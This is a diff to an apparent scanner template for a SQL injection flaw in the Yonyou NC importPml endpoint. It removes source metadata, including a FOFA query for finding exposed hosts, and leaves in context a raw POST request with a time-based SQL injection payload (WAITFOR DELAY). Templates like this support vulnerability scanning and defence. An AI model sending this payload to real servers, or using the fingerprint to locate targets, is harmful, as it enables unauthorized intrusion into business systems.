@@ -3,12 +3,8 @@ info:
   name: 用友NC importPml SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/vu9ow1zdutfcgbtp'
+  description: ''
   tags: sqli,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: vu9ow1zdutfcgbtp
-    fofa: icon_hash="1085941792" && body="/logo/images/logo.gif"
 http:
 - raw:
   - 'POST /portal/pt/portalpage/importPml?pageId=login&billitem=1''WAITFOR+DELAY+''0:0:5''-- HTTP/1.1
@@ -18,8 +14,6 @@ http:
 
 
     Connection: close
-
-
 
 
     ------WebKitFormBoundaryH970hbttBhoCyj9V
